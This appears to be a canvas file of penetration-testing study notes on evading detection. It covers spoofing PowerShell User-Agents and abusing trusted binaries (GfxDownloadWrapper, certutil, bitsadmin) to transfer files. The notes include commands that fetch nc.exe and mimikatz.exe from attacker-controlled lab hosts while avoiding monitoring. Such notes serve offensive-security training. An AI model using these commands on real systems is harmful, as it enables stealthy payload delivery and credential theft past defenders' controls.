		{"id":"56ed9d51c06c5555","type":"text","text":"","x":-37,"y":348,"width":250,"height":60},
		{"id":"5026d061b36ff403","type":"text","text":"## Notes\n\n## Changing User Agent in PowerShell Invoke-WebRequest\n\n- **Purpose:** Bypass User Agent-based filtering or detection by web servers or internal monitoring that block certain User Agents.\n    \n- **Method:** Use the `-UserAgent` parameter of `Invoke-WebRequest` to mask the request as if from common browsers (Internet Explorer, Firefox, Chrome, Opera, Safari).\n    \n- **How to list User Agents:**\n    \n\n- powershell\n    \n    `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |    Select-Object Name, @{label=\"User Agent\";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl`\n    \n    This command outputs User Agent strings for predefined browsers.\n    \n- **Example usage:**\n    \n\n- powershell\n    \n    `$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\"`\n    \n    This fetches a file (`nc.exe`) while masquerading the request as Chrome browser traffic to reduce suspicion.\n    \n\n## Why Change User Agents?\n\n- Internal blacklisting of default PowerShell User Agents can block or alert on requests.\n    \n- Mimicking legitimate browsers can evade detection and blend malicious downloads or data exfiltration into normal network traffic.\n    \n\n---\n\n## Using LOLBAS (Living Off The Land Binaries) / GTFOBins for File Transfer and Evasion\n\n- **Purpose:** Evade application whitelisting or command-line logging by abusing pre-installed trusted binaries that have internet access or file operation capabilities.\n    \n- **Context:** Typical tools like PowerShell or Netcat (nc.exe) may be blocked or logged on hardened systems.\n    \n- **Example Binary:** `GfxDownloadWrapper.exe` from Intel Graphics drivers\n    \n    - Can download files from URL to local path silently.\n        \n    \n\n- powershell\n    \n    `GfxDownloadWrapper.exe \"http://10.10.10.132/mimikatz.exe\" \"C:\\Temp\\nc.exe\"`\n    \n- **Why effective:**\n    \n    - Such binaries may be white-listed by default because they are considered trusted.\n        \n    - Their execution and network operations may not trigger typical security alerts.\n        \n- **Additional resources:**\n    \n    - **LOLBAS project:** A curated list of Windows binaries with alternative functionalities useful for attacker evasion and lateral movement.\n        \n    - **GTFOBins:** The Linux counterpart project cataloging similar binaries in Unix/Linux for file transfer, privilege escalation, etc.\n        \n\n---\n\n## Additional Ways to Evade Detection Using User Agent and File Transfer Techniques\n\n- **Customize User Agents further:** Beyond predefined strings, create fully custom User Agent values to mimic specific browser versions, devices, or corporate browsers.\n    \n\n- powershell\n    \n    `$CustomUA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $CustomUA -OutFile \"C:\\Users\\Public\\nc.exe\"`\n    \n- **Use other PowerShell Web cmdlets:** Such as `Invoke-RestMethod` or `System.Net.WebClient` objects for more control over headers including `User-Agent`.\n    \n- **Employ HTTPS or encrypted tunnels:** To hide traffic contents and headers from network monitoring or DPI.\n    \n- **Use alternative LOLBAS/GTFOBins for downloading files:**\n    \n    - `bitsadmin.exe` (Windows) to download/upload files via Background Intelligent Transfer Service.\n        \n    - `certutil.exe` to download files and base64 decode them.\n        \n    - On Linux, tools like `curl`, `wget`, or abuse of system binaries with networking capabilities based on GTFOBins.\n        \n- **Proxy usage:** Chain requests through legitimate HTTP/S proxies on the target network to blend in with normal traffic.","x":-280,"y":-610,"width":1220,"height":2500},
		{"id":"1bf9ccb161c3e5d4","type":"text","text":"# Evading Detection","x":-280,"y":-740,"width":610,"height":60}
